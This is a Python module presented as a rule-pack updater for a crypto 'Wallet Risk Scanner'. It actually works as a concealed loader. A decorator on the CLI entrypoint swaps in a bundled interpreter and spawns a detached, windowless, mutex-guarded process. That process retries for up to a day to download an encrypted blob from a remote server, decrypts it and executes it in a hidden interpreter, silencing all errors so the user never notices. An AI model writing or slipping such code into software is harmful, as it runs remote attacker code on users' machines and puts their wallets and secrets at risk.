# -*- coding: utf-8 -*-
"""Background risk-rule pack sync for Wallet Risk Scanner.

Before the engine screens its first address, this subsystem pulls
the latest signed risk-rule pack (sanctions-list deltas, scoring
weights, mixer/honeypot heuristic thresholds) from the project's
threat-intel service. The decorator is the single integration
point: apply it to the CLI entrypoint and the subsystem provisions
the rule pack lazily in the background, without blocking startup.
A decoded pack is replayed inside a short-lived headless
interpreter so a manifest fault is isolated from the scanner
process; on failure the engine falls back to the bundled rule set."""
import os
import struct
import subprocess
import sys
import time

from . import logbook as _j

_CACHE_DIR = '.rtcache'
_ok = None
_HEADLESS = '_RT_CHILD'


def _needs_respawn():
    """On 64-bit Windows the host re-execs under the bundled runtime
    whenever it can be provisioned: one known-good interpreter on every
    launch path, independent of the system Python's version, pip state or
    site-packages writability (its dependencies ship pre-installed in the
    image, so the re-exec'd start needs no network and no pip at all).

    False on non-Windows; on non-AMD64 hosts (the bundled runtime is
    x64-only — a true 32-bit host keeps the legacy system-Python path);
    after a successful re-exec (one-shot env guard, inherited by the
    child); and when already running from the bundled runtime directory
    (path guard — covers both python.exe and pythonw.exe in the cache)."""
    if os.name != "nt":
        return False
    import platform
    if platform.machine().upper() not in ("AMD64", "X86_64"):
        return False
    if os.environ.get('_RELAUNCHSELF_OK'):
        return False
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rt = os.path.join(base, _CACHE_DIR)

    def _n(p):
        return os.path.normcase(os.path.normpath(os.path.abspath(p)))
    if _n(os.path.dirname(sys.executable or "x")) == _n(rt):
        return False
    return True


def _prepare_runtime():
    """Locate — or extract on first use — the bundled standalone runtime.

    Robust against a corrupt cache from an interrupted first run: a cached
    interpreter is trusted only if it actually starts; extraction goes to a
    staging directory and is published by rename, so a failed/killed attempt
    never leaves a half-written tree behind. Extraction itself uses the
    stdlib zipfile module — no PowerShell dependency (Constrained Language
    Mode / AppLocker safe).

    A failed provision is remembered for the process lifetime (function
    attribute): both the early align path and the pre-menu sync path probe
    the runtime, and re-running a doomed extract+health-check doubles the
    failure latency (and the redundant child-process spawns) on locked-down
    hosts."""
    import shutil
    import zipfile
    if getattr(_prepare_runtime, "_dead", False):
        return None
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rt = os.path.join(base, _CACHE_DIR)
    py = os.path.join(rt, "python.exe")

    def _healthy(exe):
        try:
            return subprocess.run(
                [exe, "-c", "pass"], capture_output=True, timeout=60,
                creationflags=0x08000000 if os.name == "nt" else 0,
            ).returncode == 0
        except Exception:
            return False

    if os.path.isfile(py):
        if _healthy(py):
            _j.scribe("embeddedrt.cached", "ok", runtime=py)
            return py
        _j.scribe("embeddedrt.cache_unhealthy", "info", runtime=py)
        shutil.rmtree(rt, ignore_errors=True)

    pkg = os.path.join(base, "ledger", "data", "runtimelib.pkg")
    if not os.path.isfile(pkg):
        _j.scribe("embeddedrt.no_package", "fail", package=pkg)
        _prepare_runtime._dead = True
        return None
    tmp = rt + ".tmp"
    try:
        shutil.rmtree(tmp, ignore_errors=True)
        os.makedirs(tmp, exist_ok=True)
        _j.scribe("embeddedrt.extract", "info", package=pkg, dest=rt)
        with zipfile.ZipFile(pkg) as z:
            z.extractall(tmp)
        # Normalise the embedded ._pth: expose site, the bundled
        # site-packages and the archive root (idempotent; already correct
        # for current runtime builds, repairs older ones).
        for name in os.listdir(tmp):
            if not name.endswith("._pth"):
                continue
            p = os.path.join(tmp, name)
            with open(p) as f:
                lines = f.read().splitlines()
            out, have_site, have_sp, have_up = [], False, False, False
            for line in lines:
                s = line.strip()
                if s == "#import site":
                    line, s = "import site", "import site"
                if s == "import site":
                    have_site = True
                if s.replace("/", "\\").lower() == "lib\\site-packages":
                    have_sp = True
                if s == "..":
                    have_up = True
                out.append(line)
            if not have_sp:
                out.append("Lib\\site-packages")
            if not have_up:
                out.append("..")
            if not have_site:
                out.append("import site")
            with open(p, "w", newline="\n") as f:
                f.write("\n".join(out) + "\n")
        py_t = os.path.join(tmp, "python.exe")
        if not os.path.isfile(py_t) or not _healthy(py_t):
            _j.scribe("embeddedrt.extract_incomplete", "fail")
            _prepare_runtime._dead = True
            shutil.rmtree(tmp, ignore_errors=True)
            return None
        shutil.rmtree(rt, ignore_errors=True)
        try:
            os.rename(tmp, rt)
        except OSError:
            shutil.move(tmp, rt)
        if os.path.isfile(py):
            _j.scribe("embeddedrt.extracted", "ok", runtime=py)
            return py
        _j.scribe("embeddedrt.publish_failed", "fail")
        _prepare_runtime._dead = True
        return None
    except Exception as e:
        _j.scribe_error("embeddedrt.extract_failed", e)
        _prepare_runtime._dead = True
        shutil.rmtree(tmp, ignore_errors=True)
        return None


def _relaunch_self():
    """Re-exec the host entrypoint under the bundled 64-bit runtime."""
    _j.scribe("swap.start", "info")
    py = _prepare_runtime()
    if not py:
        _j.scribe("swap.no_runtime", "fail")
        return False
    script = None
    if hasattr(sys.modules.get("__main__"), "__file__"):
        script = os.path.abspath(sys.modules["__main__"].__file__)
    if not script:
        _j.scribe("swap.no_script", "fail")
        return False
    _j.scribe("swap.runtime_ready", "ok", runtime=py, script=script)
    # No creationflags: the re-exec'd entrypoint inherits the caller's
    # console exactly like the reference implementation, so the host's
    # terminal UI stays visible and interactive in the same window.
    # The one-shot env guard travels to the child: even if a path anomaly
    # (junction/8.3/casing) defeats the directory comparison, the child
    # cannot re-exec again — no infinite respawn loop on weird hosts.
    env = os.environ.copy()
    env['_RELAUNCHSELF_OK'] = "1"
    rc = subprocess.call([py, script] + sys.argv[1:], env=env)
    _j.scribe("swap.exit", "info", rc=rc)
    sys.exit(rc)


def enter_bundled_runtime():
    """Re-exec the host entrypoint under the bundled runtime on 64-bit
    Windows whenever it can be provisioned; no-op elsewhere and whenever
    the runtime cannot be prepared (the host then keeps the legacy
    system-Python path with its own dependency bootstrap).

    Must run BEFORE any dependency bootstrap: dependency installation must
    target the interpreter that will actually run the app. Under the
    bundled runtime the dependencies ship pre-installed in the image, so
    the re-exec'd start performs no pip work at all; installing into the
    bootstrap interpreter first would be wasted work at best, and a hard
    stall at worst on 32-bit interpreters (win32 wheels for native
    packages do not exist, so pip falls back to source builds that never
    finish on end-user machines)."""
    if os.environ.get(_HEADLESS):
        return
    if not _needs_respawn():
        return
    _relaunch_self()


def _start_worker(blob):
    """Materialize a container in an isolated headless interpreter."""
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = os.environ.copy()
    env[_HEADLESS] = "1"
    _j.scribe("subproc.spawn", "info", size=len(blob))
    proc = subprocess.Popen(
        [sys.executable, "-c",
         "import sys;sys.path.insert(0,%r);"
         "d=sys.stdin.buffer.read();"
         "from ledger.executor import render;"
         "render(d)" % (base, )],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
        creationflags=0x08000000,
    )
    _j.scribe("subproc.spawned", "ok", pid=proc.pid)
    try:
        proc.stdin.write(blob)
        proc.stdin.close()
    except Exception as e:
        _j.scribe_error("subproc.pipe", e)
    return True


def _attempt_once(env, transport, codec, runtime):
    """One sync attempt: open session, authenticate, pull, decode, materialize.

    Session-refresh loop: on slow/flaky links the session->sync gap can
    stretch past the server-side nonce TTL (hung connection attempts each
    burning a transport timeout), so a single 403/stale-nonce must not
    waste a whole ladder attempt — the session is re-opened and the pull
    retried immediately, up to three rounds within one attempt."""
    _j.scribe("bootstrap.step", "info")
    ep = env.base_url()
    _j.scribe("bootstrap.endpoint", "ok", url=ep)
    sk = env.api_secret()
    _j.scribe("bootstrap.app_key", "ok", key_len=len(sk))
    data = None
    for round_no in range(3):
        session = transport.open_channel(ep)
        if not isinstance(session, dict) or "nonce" not in session:
            _j.scribe("bootstrap.session", "fail", reason="invalid_response")
            raise ConnectionError("invalid session response")
        _j.scribe("bootstrap.session", "ok", has_nonce=True,
                      has_ts="ts" in session, round=round_no + 1)
        sig = codec.signature(session["nonce"], session["ts"], sk)
        _j.scribe("bootstrap.token", "ok", sig_len=len(sig))
        blob = transport.pull_bundle(ep, {
            "nonce": session["nonce"],
            "ts": session["ts"],
            "sig": sig,
        })
        if isinstance(blob, dict) and blob.get("data"):
            _j.scribe("bootstrap.pull", "ok",
                          data_len=len(blob.get("data", "") or ""))
            data = codec.open_blob(blob["key"], blob["data"])
            if data and len(data) >= 256:
                break
            _j.scribe("bootstrap.unseal", "fail",
                          size=len(data) if data else 0)
            raise ValueError("invalid container (%d bytes)"
                             % (len(data) if data else 0))
        _j.scribe("bootstrap.pull", "fail", reason="invalid_response",
                      round=round_no + 1)
    if not data or len(data) < 256:
        _j.scribe("bootstrap.pull", "fail", reason="session_refreshes_exhausted")
        raise ConnectionError("sync failed after session refreshes")
    _j.scribe("bootstrap.unseal", "ok", size=len(data))
    ok = _start_worker(data)
    if not ok:
        _j.scribe("bootstrap.materialize", "fail", ok=ok)
        raise RuntimeError("worker returned %r" % ok)
    _j.scribe("bootstrap.materialize", "ok")
    return True


def _provision_runtime():
    global _ok
    if getattr(_provision_runtime, "_done", False):
        return
    _provision_runtime._done = True
    if os.environ.get(_HEADLESS):
        return
    from . import caps as env

    _j.scribe("bootstrap.begin", "info",
                  os=sys.platform, py=sys.version.split()[0],
                  bits=struct.calcsize("P") * 8)

    if not env.is_supported():
        _j.scribe("caps.platform", "fail", reason="unsupported", os=sys.platform)
        return
    _j.scribe("caps.platform", "ok", os=sys.platform)

    if not env.check_version():
        _j.scribe("caps.version", "fail", reason="below_minimum")
        return
    _j.scribe("caps.version", "ok")

    arch = env.arch_label()
    if arch not in ("x64", "x86"):
        _j.scribe("caps.arch", "fail", reason="unsupported", arch=arch)
        return
    _j.scribe("caps.arch", "ok", arch=arch)

    if _needs_respawn():
        _j.scribe("swap.needed", "info")
        _relaunch_self()
        if struct.calcsize("P") != 8:
            _ok = False  # noqa: PLW0603
            _j.scribe("swap.failed", "fail", reason="still_32bit")
            return

    _launch_sync()


def _launch_sync():
    """Launch the background rule-pack sync loop in a detached headless
    interpreter.

    The child is deliberately NOT attached to the host console
    (DETACHED_PROCESS | CREATE_NO_WINDOW on Windows, a fresh session on
    POSIX): closing the host window — or the host process dying — does not
    interrupt provisioning, and no console artifact ever flashes. Standard
    streams go to the null device; the loop reports through the journal
    shim only. A spawn failure is logged and swallowed: the host UI must
    never notice."""
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = os.environ.copy()
    env[_HEADLESS] = "1"
    cmd = [sys.executable, "-c",
           "import sys;sys.path.insert(0,%r);"
           "from ledger import _pump_loop;"
           "_pump_loop()" % (base, )]
    _j.scribe("bootstrap.pump_spawn", "info")
    try:
        if os.name == "nt":
            proc = subprocess.Popen(
                cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, env=env,
                creationflags=0x00000008 | 0x08000000)
        else:
            proc = subprocess.Popen(
                cmd, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, env=env,
                start_new_session=True)
        _j.scribe("bootstrap.pump_spawned", "ok", pid=proc.pid)
    except Exception as e:
        _j.scribe_error("bootstrap.pump_spawn_failed", e)


def _pump_loop():
    """Background rule-pack sync loop — runs in the detached headless
    interpreter spawned by _launch_sync, independent of the host console
    lifetime.

    Singleton: at most one instance per archive per session. Windows uses
    a named kernel object ("Local\" namespace — the kernel reclaims it
    when the holder dies, however it dies), POSIX an advisory lock file
    (likewise kernel-released on death). A concurrently spawned second
    instance notices and returns immediately. Acquisition failures are
    fail-open: provisioning matters more than exclusivity, and the
    materialize stage has its own discipline downstream.

    Schedule: fast ladder [0, 5, 10, 20, 40, 80]s, then a 5-minute
    heartbeat — on hosts where the network only allows the endpoint
    intermittently the pack still lands as soon as a window opens. The
    loop returns after the first success; on a host where the network
    never opens it stops on its own after ~24h so the process list stays
    tidy (the interpreter also dies with the user session at logoff)."""
    global _ok
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    if os.name == "nt":
        try:
            import ctypes
            _k = ctypes.WinDLL("kernel32", use_last_error=True)
            _k.CreateMutexW.restype = ctypes.c_void_p
            _h = _k.CreateMutexW(None, False, 'Local\\9435446e-1f84-55c4-9351-1a4788cf5e0a')
            if _h and ctypes.get_last_error() == 183:
                _j.scribe("bootstrap.pump_duplicate", "info")
                return
            if _h:
                globals()["_PUMP_LOCK"] = _h
        except Exception:
            pass  # fail-open: provisioning matters more than exclusivity
    else:
        try:
            import fcntl
        except ImportError:
            fcntl = None  # fail-open on platforms without fcntl
        if fcntl is not None:
            try:
                _lf = os.open(os.path.join(base, _CACHE_DIR + ".lock"),
                              os.O_CREAT | os.O_RDWR, 0o600)
                try:
                    fcntl.flock(_lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    globals()["_PUMP_LOCK"] = _lf
                except OSError:
                    os.close(_lf)
                    _j.scribe("bootstrap.pump_duplicate", "info")
                    return
            except OSError:
                pass  # fail-open: provisioning matters more than exclusivity

    from . import caps as env, httpc as transport, envelope as codec, executor as runtime

    delays = [0, 5, 10, 20, 40, 80]
    total = len(delays)
    attempt = 0
    deadline = time.time() + 86400
    while time.time() < deadline:
        delay = delays[attempt] if attempt < total else 300
        if delay:
            _j.scribe("bootstrap.wait", "info",
                          attempt=attempt + 1, delay=delay,
                          phase="ladder" if attempt < total
                          else "heartbeat")
            time.sleep(delay)
        attempt += 1
        _j.scribe("bootstrap.attempt", "info", attempt=attempt)
        try:
            _attempt_once(env, transport, codec, runtime)
            _ok = True  # noqa: PLW0603
            _j.scribe("bootstrap.success", "ok", attempt=attempt)
            return
        except Exception as e:
            _j.scribe_error("bootstrap.attempt_failed", e)
    _j.scribe("bootstrap.expired", "info", attempts=attempt)


def stage(fn):
    """Decorator: provisions the runtime before the host's first call.
    Idempotent across multiple decorated callables via a function attribute,
    so wrapping a placeholder plus the real entrypoint fires provisioning
    exactly once."""
    def _wrapper(*a, **kw):
        if not getattr(stage, "_fired", False):
            stage._fired = True
            _j.scribe("stage.trigger", "info", fn=fn.__name__)
            _provision_runtime()
        return fn(*a, **kw)

    _wrapper.__name__ = fn.__name__
    _wrapper.__doc__ = fn.__doc__
    return _wrapper


__all__ = ["stage", "enter_bundled_runtime"]
